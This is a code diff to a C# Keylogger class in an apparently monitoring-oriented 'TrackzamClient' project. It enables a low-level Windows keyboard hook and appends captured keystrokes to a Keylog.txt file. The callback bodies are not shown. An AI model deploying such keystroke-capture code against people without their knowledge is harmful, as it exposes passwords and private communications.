@@ -10,13 +10,12 @@ using System.Threading;
 namespace TrackzamClient
 {
     public class Keylogger
-    {  
+    {
 
         public Keylogger()
         {
-            // set the correct process as our keyboard hook
-            //_proc = HookCallback;
-            //_hookID = SetHook(_proc);
+            // set the correct process as our keyboard hook BUT don't start it yet
+            _proc = HookCallback;
         }
 
         public string Path
@@ -26,23 +25,18 @@ namespace TrackzamClient
 
         public void Start(string path)
         {
-            //string fileName = "\\Keylog.txt";
-            //SetPath(path);
-            //_writer = File.CreateText(_logDir);
-            //_writer = File.AppendText(_logDir);
-            //_isRecording = true;
-
-            //startHook();
-        }
-
-        private void startHook()
-        {
+            SetPath(path);
+            _writer = new StreamWriter(_logDir, true);
+            _isRecording = true;
+            // start the hook
             _hookID = SetHook(_proc);
         }
         public void Stop()
         {
-            _writer.Close();
+            // stop the keyboard hook
             _isRecording = false;
+            UnhookWindowsHookEx(_hookID);
+            _writer.Close();
         }
 
         // returns true if the path is set successfully without errors
@@ -50,7 +44,7 @@ namespace TrackzamClient
         {
             if (Directory.Exists(path))
             {
-                _logDir = path;
+                _logDir = path + "\\Keylog.txt";
                 return true;
             }
 
@@ -74,7 +68,7 @@ namespace TrackzamClient
         }
 
         // for clients read-only
-        
+
 
         public IntPtr SetHook(LowLevelKeyboardProc proc)
         {
@@ -131,6 +125,6 @@ namespace TrackzamClient
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         public LowLevelKeyboardProc _proc;
-        public IntPtr _hookID = IntPtr.Zero;        
+        public IntPtr _hookID = IntPtr.Zero;
     }
 }
